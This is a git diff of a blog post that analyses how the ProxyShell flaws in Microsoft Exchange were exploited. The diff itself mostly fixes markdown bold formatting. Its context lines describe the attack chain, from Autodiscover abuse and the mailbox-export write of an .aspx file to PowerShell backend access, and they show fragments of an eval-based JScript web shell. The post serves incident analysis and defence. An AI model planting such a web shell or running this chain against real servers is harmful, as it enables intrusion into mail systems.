@@ -8,13 +8,13 @@ title:  "ProxyShell vulnerabilities exploited"
 
 
 
-## ****Initial access****
+## **Initial access**
 
 To create a web shell on a Microsoft exchange server by exporting from a mailbox, first, the attacker needs to create an item within a mailbox. The attacker usually abuses the **Autodiscover** service by using for example, Metasploit implementation of the **CVE** payload, however, the **Autodiscover** is a feature which allows Outlook administration to configure and mange user profiles for Outlook. The attacker abuses the **Autodiscover** service to leak an Outlook user’s Distinguished Name (DN). The DN is a native address format for recipients in Microsoft Exchange Server, also it is one of the addressing formats for objects within Active Directory in Microsoft Windows Server. The attacker requests a DN to leak the user security identifier (SID) to get access token into exchange server to obtain access token into exchange server, and the (**Autodiscover**) service is a MS Exchange service that is typically used to look up **EWS** endpoint URL. Consequently, a draft email message is created in the user mailbox along with a webshell attached as a file, which is later extracted and accessed via **HTTP** request.
 
 ---
 
-## ****CVE-2021-34473****
+## **CVE-2021-34473**
 
 The vulnerability allows a malicious actor to open a mailbox of another user through the browser, by providing the mailbox address in the URL, this vulnerability provides full access to backend of the exchange server.
 Besides, the CVE-2021-34473 has a capability to use the string `Autodiscover/Autodiscover.json`  to pass the email address field in the URL. This gives the malicious actor arbitrary access to the backend URLs as **NT AUTHORITY/SYSTEM.**
@@ -40,7 +40,7 @@ Subsequently, the malicious actor sent another HTTP POST request to get the SID 
 
 ---
 
-## ****CVE-2021-34523****
+## **CVE-2021-34523**
 
 The malicious actor exploited the vulnerability **CVE-2021-34523** on exchange server to downgrade  the privileges of the Exchange PowerShell Backend, and this gives the malicious actor the ability to execute powershell remotely as administrator. This feature is natively built into Microsoft Exchange which is considered an administrative tool. However, the **CVE-2021-34473** grants access to the ‘NT **AUTHORITY/SYSTEM**’ user which doesn’t have a mailbox which is needed for the PowerShell backend.  Therefore, the malicious actor utilized “Hamad@darksys.com” mailbox to use the Powershell backend.
 
@@ -95,7 +95,7 @@ Webshell post-extracting from certificate
 
 ---
 
-## ****CVE-2021-31207****
+## **CVE-2021-31207**
 
 This vulnerability allows the attacker to write files. As soon as the role “Import Export Mailbox” is assigned to the impersonated user, and the attacker has the ability to execute PowerShell commands. The command “**New-MailboxExportRequest**” can be used to export the target mailboxes to any path as a **PST** file with extension “.aspx”. This will decodes the encoded web shell in the email and writes it to the newly created .aspx file.
 
@@ -135,6 +135,7 @@ script language = 'JScript' runat = 'server' >function Page_Load() {    eval(Req
 ![The PST File with plain JavaScript code](https://raw.githubusercontent.com/hamad-she/hamad-she.github.io/master/_posts/imgs/proxyshell/Untitled%204.png)
 
 The PST File with plain JavaScript code
+
 
 ---
 
@@ -176,3 +177,4 @@ when the webshell is accessed using a browser, two textboxes will be displayed a
  </body>
  </html>
 ```
+png
